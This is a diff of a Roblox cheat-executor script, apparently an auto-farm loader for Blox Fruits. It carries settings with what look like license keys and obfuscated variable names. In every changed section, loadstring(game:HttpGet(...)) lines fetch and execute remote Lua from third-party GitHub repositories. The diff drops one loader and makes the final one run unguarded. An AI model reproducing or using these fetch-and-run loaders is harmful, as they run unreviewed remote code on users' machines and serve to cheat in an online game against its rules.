@@ -1,5 +1,4 @@
 repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
-task.spawn(function() pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/u400822/module/refs/heads/main/checkonline.lua"))) end)
 getgenv().Hermanos_Settings = {
     ['key'] = '9d6ca419-5148-4b0b-905e-2eb250c480af',
     ['PC'] = 'Nexus',
@@ -15,7 +14,7 @@ getgenv().Hermanos_Settings = {
         'Shadow', 'Dough', 'Mammoth', 'T-Rex', 'Dragon (East)', 'Buddha', 'Spider', 'Love', 'Rumble', 'Buddha', 'Quake', 'Phoenix', 'Blizzard'
     }
 }
-task.spawn(function() pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/hermanos-dev/hermanos-script/main/main.lua"))) end)
+task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hermanos-dev/hermanos-script/main/main.lua"))() end) end)
 local t4n7y1w0zvm = game:GetService("Lighting")
 local b5k6r0quapx = workspace:FindFirstChildOfClass("Terrain")
 local m3q0jxswz2c = game:GetService("CoreGui")
@@ -189,4 +188,4 @@ getgenv().Key = "079a407d0e28b243a65af94c"
             ["WebhookUrl"] = "",
         }
     }
-task.spawn(function() pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaCat-kaitunBF.lua"))) end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaCat-kaitunBF.lua"))()
